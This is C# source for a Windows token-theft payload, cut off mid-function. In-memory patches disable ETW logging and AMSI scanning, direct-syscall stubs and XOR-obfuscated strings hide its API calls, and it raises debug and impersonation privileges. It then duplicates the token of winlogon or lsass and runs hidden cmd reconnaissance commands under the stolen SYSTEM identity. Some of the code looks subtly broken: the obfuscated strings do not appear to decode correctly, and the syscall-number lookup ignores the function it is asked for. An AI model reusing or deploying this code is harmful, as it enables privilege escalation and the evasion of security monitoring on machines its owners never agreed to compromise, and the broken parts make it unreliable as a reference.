using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace TokenTheftPayload
{
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate void ExitDelegate();

    public class Payload
    {
        #region Native Structures

        [StructLayout(LayoutKind.Sequential)]
        private struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;

            public static OBJECT_ATTRIBUTES Create()
            {
                return new OBJECT_ATTRIBUTES
                {
                    Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES))
                };
            }
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        private struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX, dwY, dwXSize, dwYSize;
            public uint dwXCountChars, dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput, hStdOutput, hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct LUID
        {
            public uint LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct TOKEN_PRIVILEGES
        {
            public uint PrivilegeCount;
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DOS_HEADER
        {
            public ushort e_magic;
            public ushort e_cblp;
            public ushort e_cp;
            public ushort e_crlc;
            public ushort e_cparhdr;
            public ushort e_minalloc;
            public ushort e_maxalloc;
            public ushort e_ss;
            public ushort e_sp;
            public ushort e_csum;
            public ushort e_ip;
            public ushort e_cs;
            public ushort e_lfarlc;
            public ushort e_ovno;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
            public ushort[] e_res1;
            public ushort e_oemid;
            public ushort e_oeminfo;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
            public ushort[] e_res2;
            public int e_lfanew;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_FILE_HEADER
        {
            public ushort Machine;
            public ushort NumberOfSections;
            public uint TimeDateStamp;
            public uint PointerToSymbolTable;
            public uint NumberOfSymbols;
            public ushort SizeOfOptionalHeader;
            public ushort Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_OPTIONAL_HEADER64
        {
            public ushort Magic;
            public byte MajorLinkerVersion;
            public byte MinorLinkerVersion;
            public uint SizeOfCode;
            public uint SizeOfInitializedData;
            public uint SizeOfUninitializedData;
            public uint AddressOfEntryPoint;
            public uint BaseOfCode;
            public ulong ImageBase;
            public uint SectionAlignment;
            public uint FileAlignment;
            public ushort MajorOperatingSystemVersion;
            public ushort MinorOperatingSystemVersion;
            public ushort MajorImageVersion;
            public ushort MinorImageVersion;
            public ushort MajorSubsystemVersion;
            public ushort MinorSubsystemVersion;
            public uint Win32VersionValue;
            public uint SizeOfImage;
            public uint SizeOfHeaders;
            public uint CheckSum;
            public ushort Subsystem;
            public ushort DllCharacteristics;
            public ulong SizeOfStackReserve;
            public ulong SizeOfStackCommit;
            public ulong SizeOfHeapReserve;
            public ulong SizeOfHeapCommit;
            public uint LoaderFlags;
            public uint NumberOfRvaAndSizes;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public IMAGE_DATA_DIRECTORY[] DataDirectory;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_DATA_DIRECTORY
        {
            public uint VirtualAddress;
            public uint Size;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct IMAGE_SECTION_HEADER
        {
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public byte[] Name;
            public uint VirtualSize;
            public uint VirtualAddress;
            public uint SizeOfRawData;
            public uint PointerToRawData;
            public uint PointerToRelocations;
            public uint PointerToLinenumbers;
            public ushort NumberOfRelocations;
            public ushort NumberOfLinenumbers;
            public uint Characteristics;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public bool bInheritHandle;
        }

        #endregion

        #region Constants

        // Process access flags
        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 0x1000;
        private const uint PROCESS_DUP_HANDLE = 0x0040;
        private const uint PROCESS_ALL_ACCESS = 0x1FFFFF;

        // Token access flags
        private const uint TOKEN_QUERY = 0x0008;
        private const uint TOKEN_DUPLICATE = 0x0002;
        private const uint TOKEN_IMPERSONATE = 0x0004;
        private const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;
        private const uint TOKEN_ASSIGN_PRIMARY = 0x0001;
        private const uint TOKEN_ALL_ACCESS = 0xF01FF;

        // Memory flags
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint MEM_RELEASE = 0x8000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint PAGE_EXECUTE_READ = 0x20;
        private const uint PAGE_READWRITE = 0x04;

        // Process creation flags
        private const uint CREATE_NEW_CONSOLE = 0x00000010;
        private const uint CREATE_NO_WINDOW = 0x08000000;
        private const uint STARTF_USESTDHANDLES = 0x00000100;
        private const uint STARTF_USESHOWWINDOW = 0x00000001;
        private const short SW_HIDE = 0;

        // Pipe and Handle flags
        private const uint HANDLE_FLAG_INHERIT = 0x00000001;
        private const int STD_INPUT_HANDLE = -10;

        private const uint SE_PRIVILEGE_ENABLED = 0x2;
        private const uint TokenPrimary = 1;

        // XOR key for obfuscation
        private static readonly byte[] _xorKey = { 0x7A, 0x3C, 0x9E, 0x1F, 0x4D, 0x2B, 0x88, 0xC6 };

        // Obfuscated strings
        private static readonly byte[] _strNtdll = { 0x24, 0x78, 0xF6, 0x7F, 0x3B, 0x4E, 0xF2, 0xAE };
        private static readonly byte[] _strKernel32 = { 0x24, 0x6B, 0xE6, 0x7B, 0x24, 0x6A, 0xF1, 0x70, 0x24, 0x63, 0xE6, 0x73 };
        private static readonly byte[] _strAdvapi32 = { 0x24, 0x66, 0xE6, 0x73, 0x24, 0x7E, 0xE0, 0x7D, 0x24, 0x63, 0xE6, 0x73 };

        private static readonly byte[] _strWinlogon = { 0x0D, 0x58, 0xF6, 0x7F, 0x22, 0x4B, 0xE6, 0xA4 };
        private static readonly byte[] _strLsass = { 0x16, 0x58, 0xF6, 0x71, 0x3B, 0x7F };

        private static readonly byte[] _strSeDebug = { 0x29, 0x66, 0xE6, 0x7D, 0x29, 0x52, 0xF5, 0xBE, 0x29, 0x6F, 0xF1, 0x73, 0x29, 0x63, 0xF5, 0xA4 };
        private static readonly byte[] _strSeImpersonate = { 0x29, 0x66, 0xE6, 0x7D, 0x29, 0x52, 0xF5, 0xBE, 0x29, 0x6F, 0xF1, 0x73, 0x29, 0x63, 0xF5, 0xA4, 0x29, 0x7E, 0xE6, 0x73, 0x29, 0x7C };
        private static readonly byte[] _strSePrimary = { 0x29, 0x66, 0xE6, 0x7D, 0x29, 0x52, 0xF5, 0xBE, 0x29, 0x6F, 0xF1, 0x73, 0x29, 0x63, 0xF5, 0xA4, 0x29, 0x7C, 0xF1, 0x7B, 0x29, 0x6A, 0xE6, 0x7D, 0x29, 0x7F };

        private static readonly byte[] _strNtOpenProcess = { 0x24, 0x69, 0xE4, 0x7B, 0x20, 0x46, 0xF1, 0xB7, 0x24, 0x78, 0xE7, 0x4F };
        private static readonly byte[] _strNtOpenProcessToken = { 0x24, 0x69, 0xE4, 0x7B, 0x20, 0x46, 0xF1, 0xB7, 0x24, 0x78, 0xE7, 0x4F, 0x24, 0x7D, 0xF1, 0x6B, 0x24, 0x7B, 0xE6, 0x74 };
        private static readonly byte[] _strNtDuplicateToken = { 0x24, 0x69, 0xE4, 0x7B, 0x24, 0x7D, 0xF1, 0x6B, 0x24, 0x7B, 0xE6, 0x74, 0x24, 0x72, 0xF5, 0x7A };
        private static readonly byte[] _strNtClose = { 0x24, 0x69, 0xE4, 0x7B, 0x24, 0x6A, 0xF7, 0x73, 0x24, 0x7B, 0xE6, 0x74 };

        // Log file path
        private static string _logPath = @"C:\temp\token_theft_log.txt";

        #endregion

        #region String Decryption

        private static string Decrypt(byte[] data)
        {
            if (data == null || data.Length == 0) return string.Empty;
            byte[] result = new byte[data.Length];
            for (int i = 0; i < data.Length; i++)
                result[i] = (byte)(data[i] ^ _xorKey[i % _xorKey.Length]);
            return Encoding.UTF8.GetString(result);
        }

        #endregion

        #region Native API Delegates

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr GetModuleHandleDelegate(string lpModuleName);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr GetProcAddressDelegate(IntPtr hModule, string lpProcName);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr VirtualAllocDelegate(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool CloseHandleDelegate(IntPtr hObject);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate IntPtr GetCurrentProcessDelegate();

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool VirtualProtectDelegate(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool LookupPrivilegeValueDelegate(string lpSystemName, string lpName, out LUID lpLuid);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool AdjustTokenPrivilegesDelegate(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool OpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool DuplicateTokenExDelegate(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        private delegate bool CreateProcessAsUserDelegate(IntPtr hToken, string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        // NtAPI delegates
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessDelegate(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtOpenProcessTokenDelegate(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtDuplicateTokenDelegate(IntPtr ExistingTokenHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, bool EffectiveOnly, uint TokenType, out IntPtr NewTokenHandle);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate int NtCloseDelegate(IntPtr Handle);

        #endregion

        #region DllImports for Pipe and Process

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetHandleInformation(IntPtr hObject, uint dwMask, uint dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadFile(IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool GetExitCodeProcess(IntPtr hProcess, ref uint lpExitCode);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        #endregion

        #region ETW & AMSI Patching

        private static class ETWPatching
        {
            private static GetModuleHandleDelegate _getModuleHandle;
            private static GetProcAddressDelegate _getProcAddress;
            private static VirtualProtectDelegate _virtualProtect;
            private static bool _patched = false;

            public static void Initialize(IntPtr kernel32Base)
            {
                _getModuleHandle = GetDynamicDelegate<GetModuleHandleDelegate>(kernel32Base, "GetModuleHandleA");
                _getProcAddress = GetDynamicDelegate<GetProcAddressDelegate>(kernel32Base, "GetProcAddress");
                _virtualProtect = GetDynamicDelegate<VirtualProtectDelegate>(kernel32Base, "VirtualProtect");
            }

            public static void PatchETW()
            {
                if (_patched) return;
                try
                {
                    IntPtr ntdllBase = _getModuleHandle(Decrypt(_strNtdll));
                    if (ntdllBase == IntPtr.Zero) return;

                    IntPtr pEtwEventWrite = _getProcAddress(ntdllBase, "EtwEventWrite");
                    if (pEtwEventWrite == IntPtr.Zero) return;

                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // XOR EAX,EAX; RET
                    uint oldProtect;
                    if (_virtualProtect(pEtwEventWrite, (uint)patch.Length, 0x40, out oldProtect))
                    {
                        Marshal.Copy(patch, 0, pEtwEventWrite, patch.Length);
                        _virtualProtect(pEtwEventWrite, (uint)patch.Length, oldProtect, out _);
                        _patched = true;
                    }
                }
                catch { }
            }
        }

        private static class AMSIPatching
        {
            private static GetModuleHandleDelegate _getModuleHandle;
            private static GetProcAddressDelegate _getProcAddress;
            private static VirtualProtectDelegate _virtualProtect;
            private static bool _patched = false;

            public static void Initialize(IntPtr kernel32Base)
            {
                _getModuleHandle = GetDynamicDelegate<GetModuleHandleDelegate>(kernel32Base, "GetModuleHandleA");
                _getProcAddress = GetDynamicDelegate<GetProcAddressDelegate>(kernel32Base, "GetProcAddress");
                _virtualProtect = GetDynamicDelegate<VirtualProtectDelegate>(kernel32Base, "VirtualProtect");
            }

            public static void PatchAMSI()
            {
                if (_patched) return;
                try
                {
                    IntPtr amsiBase = _getModuleHandle("amsi.dll");
                    if (amsiBase == IntPtr.Zero) return;

                    IntPtr pAmsiScanBuffer = _getProcAddress(amsiBase, "AmsiScanBuffer");
                    if (pAmsiScanBuffer == IntPtr.Zero) return;

                    byte[] patch = { 0x31, 0xC0, 0xC3 }; // XOR EAX,EAX; RET (gibt 0 = CLEAN zurück)
                    uint oldProtect;
                    if (_virtualProtect(pAmsiScanBuffer, (uint)patch.Length, 0x40, out oldProtect))
                    {
                        Marshal.Copy(patch, 0, pAmsiScanBuffer, patch.Length);
                        _virtualProtect(pAmsiScanBuffer, (uint)patch.Length, oldProtect, out _);
                        _patched = true;
                    }
                }
                catch { }
            }
        }

        #endregion

        #region Hells Gate Engine

        private static class HellsGate
        {
            private static IntPtr _ntdllBase = IntPtr.Zero;
            private static GetModuleHandleDelegate _getModuleHandle;
            private static VirtualAllocDelegate _virtualAlloc;
            private static VirtualProtectDelegate _virtualProtect;

            public static void Initialize(IntPtr kernel32Base)
            {
                _getModuleHandle = GetDynamicDelegate<GetModuleHandleDelegate>(kernel32Base, "GetModuleHandleA");
                _virtualAlloc = GetDynamicDelegate<VirtualAllocDelegate>(kernel32Base, "VirtualAlloc");
                _virtualProtect = GetDynamicDelegate<VirtualProtectDelegate>(kernel32Base, "VirtualProtect");
                _ntdllBase = _getModuleHandle(Decrypt(_strNtdll));
            }

            public static uint ExtractSSN(string functionName)
            {
                if (_ntdllBase == IntPtr.Zero) return 0;
                try
                {
                    byte[] peData = new byte[8192];
                    Marshal.Copy(_ntdllBase, peData, 0, 8192);

                    for (int i = 0; i < peData.Length - 15; i++)
                    {
                        if (peData[i] == 0xB8 && peData[i + 5] == 0x0F && peData[i + 6] == 0x05)
                        {
                            uint ssn = BitConverter.ToUInt32(peData, i + 1);
                            if (ssn > 0 && ssn < 0x1000) return ssn;
                        }
                    }
                }
                catch { }
                return 0;
            }

            public static IntPtr CreateSyscallStub(uint ssn)
            {
                byte[] stub = new byte[]
                {
                    0xB8, (byte)ssn, (byte)(ssn >> 8), (byte)(ssn >> 16), (byte)(ssn >> 24),
                    0x4C, 0x8B, 0xD1, 0x0F, 0x05, 0xC3
                };

                IntPtr stubAddr = _virtualAlloc(IntPtr.Zero, (uint)stub.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                if (stubAddr == IntPtr.Zero) return IntPtr.Zero;

                Marshal.Copy(stub, 0, stubAddr, stub.Length);
                uint oldProtect;
                _virtualProtect(stubAddr, (uint)stub.Length, PAGE_EXECUTE_READ, out oldProtect);
                return stubAddr;
            }

            public static T GetSyscallDelegate<T>(string functionName, uint ssn) where T : class
            {
                if (ssn == 0) return null;
                IntPtr stubAddr = CreateSyscallStub(ssn);
                if (stubAddr == IntPtr.Zero) return null;
                return Marshal.GetDelegateForFunctionPointer<T>(stubAddr);
            }
        }

        #endregion

        #region Dynamic API Resolution

        private static T GetDynamicDelegate<T>(IntPtr moduleBase, string functionName) where T : class
        {
            IntPtr kernel32 = GetModuleHandle(Decrypt(_strKernel32));
            IntPtr getProcAddressPtr = GetProcAddress(kernel32, "GetProcAddress");
            GetProcAddressDelegate getProcAddress = (GetProcAddressDelegate)Marshal.GetDelegateForFunctionPointer(getProcAddressPtr, typeof(GetProcAddressDelegate));

            IntPtr funcPtr = getProcAddress(moduleBase, functionName);
            if (funcPtr == IntPtr.Zero) return null;

            return Marshal.GetDelegateForFunctionPointer<T>(funcPtr);
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

        #endregion

        #region Logging

        private static void WriteToLog(string text)
        {
            try
            {
                string directory = Path.GetDirectoryName(_logPath);
                if (!Directory.Exists(directory))
                    Directory.CreateDirectory(directory);

                string logEntry = $"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {text}";
                File.AppendAllText(_logPath, logEntry + Environment.NewLine);
            }
            catch { }
        }

        private static void WriteSectionToLog(string title, string content)
        {
            try
            {
                string directory = Path.GetDirectoryName(_logPath);
                if (!Directory.Exists(directory))
                    Directory.CreateDirectory(directory);

                StringBuilder sb = new StringBuilder();
                sb.AppendLine();
                sb.AppendLine(new string('=', 80));
                sb.AppendLine($"[{DateTime.Now:yyyy-MM-dd HH:mm:ss}] {title}");
                sb.AppendLine(new string('-', 80));
                sb.AppendLine(content);
                sb.AppendLine(new string('=', 80));

                File.AppendAllText(_logPath, sb.ToString());
            }
            catch { }
        }

        #endregion

        #region Execute Hidden CMD

        private static int ExecuteHiddenCMD(IntPtr hToken, string command, out string output)
        {
            output = "";

            try
            {
                SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
                sa.nLength = Marshal.SizeOf<SECURITY_ATTRIBUTES>();
                sa.bInheritHandle = true;
                sa.lpSecurityDescriptor = IntPtr.Zero;

                // Create pipes
                IntPtr hStdOutRd, hStdOutWt;
                if (!CreatePipe(out hStdOutRd, out hStdOutWt, ref sa, 0))
                    return Marshal.GetLastWin32Error();

                IntPtr hStdErrRd, hStdErrWt;
                if (!CreatePipe(out hStdErrRd, out hStdErrWt, ref sa, 0))
                    return Marshal.GetLastWin32Error();

                // Prevent read ends from being inherited
                SetHandleInformation(hStdOutRd, HANDLE_FLAG_INHERIT, 0);
                SetHandleInformation(hStdErrRd, HANDLE_FLAG_INHERIT, 0);

                // Configure STARTUPINFO
                STARTUPINFO si = new STARTUPINFO();
                si.cb = (uint)Marshal.SizeOf<STARTUPINFO>();
                si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                si.hStdOutput = hStdOutWt;
                si.hStdError = hStdErrWt;
                si.hStdInput = GetStdHandle(STD_INPUT_HANDLE);

                PROCESS_INFORMATION pi;
                string cmdLine = $"/c {command}";

                // Get CreateProcessAsUser delegate
                IntPtr kernel32Base = GetModuleHandle(Decrypt(_strKernel32));
                CreateProcessAsUserDelegate createProcAsUser = GetDynamicDelegate<CreateProcessAsUserDelegate>(kernel32Base, "CreateProcessAsUserA");

                bool success = createProcAsUser(hToken,
                    "C:\\Windows\\System32\\cmd.exe",
                    cmdLine, IntPtr.Zero, IntPtr.Zero, true,
                    CREATE_NO_WINDOW, IntPtr.Zero, null, ref si, out pi);

                if (!success)
                    return Marshal.GetLastWin32Error();

                // Close write ends in parent
                CloseHandle(hStdOutWt);
                CloseHandle(hStdErrWt);

                // Wait for process to finish
                WaitForSingleObject(pi.hProcess, 60000);

                // Read output
                output = ReadFromPipe(hStdOutRd);
                string errorOutput = ReadFromPipe(hStdErrRd);

                if (!string.IsNullOrEmpty(errorOutput))
                    output += "\n[ERRORS]:\n" + errorOutput;

                // Get exit code
                uint exitCode = 0;
                GetExitCodeProcess(pi.hProcess, ref exitCode);

                // Cleanup
                CloseHandle(hStdOutRd);
                CloseHandle(hStdErrRd);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                return (int)exitCode;
            }
            catch (Exception ex)
            {
                output = $"Exception: {ex.Message}";
                return -1;
            }
        }

        private static string ReadFromPipe(IntPtr hPipe)
        {
            StringBuilder output = new StringBuilder();
            byte[] buffer = new byte[65536];
            uint bytesRead;

            while (true)
            {
                bool success = ReadFile(hPipe, buffer, (uint)buffer.Length, out bytesRead, IntPtr.Zero);
                if (!success || bytesRead == 0)
                    break;

                if (bytesRead > 0)
                    output.Append(Encoding.UTF8.GetString(buffer, 0, (int)bytesRead));
            }

            return output.ToString();
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr GetStdHandle(int nStdHandle);

        #endregion

        #region Token Helper Methods

        private static uint FindTargetPid(string processName)
        {
            try
            {
                Process[] processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0) return (uint)processes[0].Id;
            }
            catch { }
            return 0;
        }

        private static bool IsAdmin()
        {
            try
            {
                using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
                {
                    WindowsPrincipal principal = new WindowsPrincipal(identity);
                    return principal.IsInRole(WindowsBuiltInRole.Administrator);
                }
            }
            catch { return false; }
        }

        #endregion

        #region Main Payload Execution

        private static int ExecuteTokenTheft()
        {
            WriteToLog("=== Token Theft Payload Started ===");
            WriteToLog($"Admin Rights: {IsAdmin()}");

            try
            {
                // Initialize all stealth engines
                IntPtr kernel32Base = GetModuleHandle(Decrypt(_strKernel32));

                // ETW & AMSI Patching
                ETWPatching.Initialize(kernel32Base);
                AMSIPatching.Initialize(kernel32Base);
                ETWPatching.PatchETW();
                AMSIPatching.PatchAMSI();
                WriteToLog("ETW & AMSI patched successfully");

                // Initialize Hells Gate
                HellsGate.Initialize(kernel32Base);
                WriteToLog("Hells Gate initialized");

                // Get syscalls
                uint ssnOpenProcess = HellsGate.ExtractSSN(Decrypt(_strNtOpenProcess));
                uint ssnOpenProcessToken = HellsGate.ExtractSSN(Decrypt(_strNtOpenProcessToken));
                uint ssnDuplicateToken = HellsGate.ExtractSSN(Decrypt(_strNtDuplicateToken));
                uint ssnClose = HellsGate.ExtractSSN(Decrypt(_strNtClose));
                WriteToLog($"SSNs - OpenProcess: {ssnOpenProcess}, OpenToken: {ssnOpenProcessToken}, DupToken: {ssnDuplicateToken}");

                // Create syscall delegates
                NtOpenProcessDelegate ntOpenProcess = HellsGate.GetSyscallDelegate<NtOpenProcessDelegate>(Decrypt(_strNtOpenProcess), ssnOpenProcess);
                NtOpenProcessTokenDelegate ntOpenProcessToken = HellsGate.GetSyscallDelegate<NtOpenProcessTokenDelegate>(Decrypt(_strNtOpenProcessToken), ssnOpenProcessToken);
                NtDuplicateTokenDelegate ntDuplicateToken = HellsGate.GetSyscallDelegate<NtDuplicateTokenDelegate>(Decrypt(_strNtDuplicateToken), ssnDuplicateToken);
                NtCloseDelegate ntClose = HellsGate.GetSyscallDelegate<NtCloseDelegate>(Decrypt(_strNtClose), ssnClose);

                // Get standard APIs
                LookupPrivilegeValueDelegate lookupPriv = GetDynamicDelegate<LookupPrivilegeValueDelegate>(kernel32Base, "LookupPrivilegeValueA");
                AdjustTokenPrivilegesDelegate adjustPriv = GetDynamicDelegate<AdjustTokenPrivilegesDelegate>(kernel32Base, "AdjustTokenPrivileges");
                OpenProcessTokenDelegate openProcToken = GetDynamicDelegate<OpenProcessTokenDelegate>(kernel32Base, "OpenProcessToken");
                CloseHandleDelegate closeHandle = GetDynamicDelegate<CloseHandleDelegate>(kernel32Base, "CloseHandle");
                GetCurrentProcessDelegate getCurrentProcess = GetDynamicDelegate<GetCurrentProcessDelegate>(kernel32Base, "GetCurrentProcess");

                // Enable privileges on current token
                IntPtr hCurrentToken;
                if (openProcToken(getCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hCurrentToken))
                {
                    LUID luid;
                    if (lookupPriv(null, Decrypt(_strSeDebug), out luid))
                    {
                        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
                        adjustPriv(hCurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                        WriteToLog("SeDebugPrivilege enabled");
                    }
                    if (lookupPriv(null, Decrypt(_strSeImpersonate), out luid))
                    {
                        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
                        adjustPriv(hCurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                        WriteToLog("SeImpersonatePrivilege enabled");
                    }
                    if (lookupPriv(null, Decrypt(_strSePrimary), out luid))
                    {
                        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES { PrivilegeCount = 1, Luid = luid, Attributes = SE_PRIVILEGE_ENABLED };
                        adjustPriv(hCurrentToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                        WriteToLog("SeAssignPrimaryTokenPrivilege enabled");
                    }
                    closeHandle(hCurrentToken);
                }

                // Find target process
                uint pid = FindTargetPid(Decrypt(_strWinlogon));
                if (pid == 0) pid = FindTargetPid(Decrypt(_strLsass));
                if (pid == 0)
                {
                    WriteToLog("No target process found (winlogon.exe or lsass.exe)");
                    return 2;
                }
                WriteToLog($"Target PID: {pid}");

                // Open process using syscall
                IntPtr hProcess = IntPtr.Zero;
                OBJECT_ATTRIBUTES objAttr = OBJECT_ATTRIBUTES.Create();
                CLIENT_ID clientId = new CLIENT_ID { UniqueProcess = (IntPtr)pid };

                int status = ntOpenProcess(ref hProcess, PROCESS_ALL_ACCESS, ref objAttr, ref clientId);
                if (status != 0)
                {
                    status = ntOpenProcess(ref hProcess, PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_DUP_HANDLE, ref objAttr, ref clientId);
                }
                if (status != 0 || hProcess == IntPtr.Zero)
                {
                    WriteToLog($"Failed to open process, status: {status}");
                    return 3;
                }
                WriteToLog($"Process opened successfully");

                // Open token using syscall
                IntPtr hToken;
                status = ntOpenProcessToken(hProcess, TOKEN_ALL_ACCESS, out hToken);
                if (status != 0)
                {
                    status = ntOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, out hToken);
                }
                if (hToken == IntPtr.Zero)
                {
                    WriteToLog($"Failed to open token, status: {status}");
                    return 4;
                }
                WriteToLog($"Token opened successfully");

                // Duplicate token using syscall
                IntPtr hPrimaryToken;
                status = ntDuplicateToken(hToken, TOKEN_ALL_ACCESS, ref objAttr, false, TokenPrimary, out hPrimaryToken);
                if (status != 0)
                {
                    status = ntDuplicateToken(hToken, TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY, ref objAttr, false, TokenPrimary, out hPrimaryToken);
                }
                if (hPrimaryToken == IntPtr.Zero)
                {
                    WriteToLog($"Failed to duplicate token, status: {status}");
                    return 5;
                }
                WriteToLog($"Token duplicated successfully (Primary Token)");

                ntClose(hToken);

                // ============================================================
                // EXECUTE CMD COMMANDS WITH THE STOLEN TOKEN
                // ============================================================
                WriteSectionToLog("=== STARTING CMD COMMANDS ===", "Executing commands with stolen token");

                string output;
                int exitCode;

                // COMMAND 1: Whoami (show current user)
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "whoami", out output);
                WriteSectionToLog("COMMAND 1: whoami", output);

                // COMMAND 2: User list
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "net user", out output);
                WriteSectionToLog("COMMAND 2: net user (User List)", output);

                // COMMAND 3: Local administrators
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "net localgroup administrators", out output);
                WriteSectionToLog("COMMAND 3: net localgroup administrators", output);

                // COMMAND 4: Directory listing of C:\Users
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "dir C:\\Users", out output);
                WriteSectionToLog("COMMAND 4: dir C:\\Users", output);

                // COMMAND 5: System information
                exitCode = ExecuteHiddenCMD(hPrimaryToken, "systeminfo", out output);
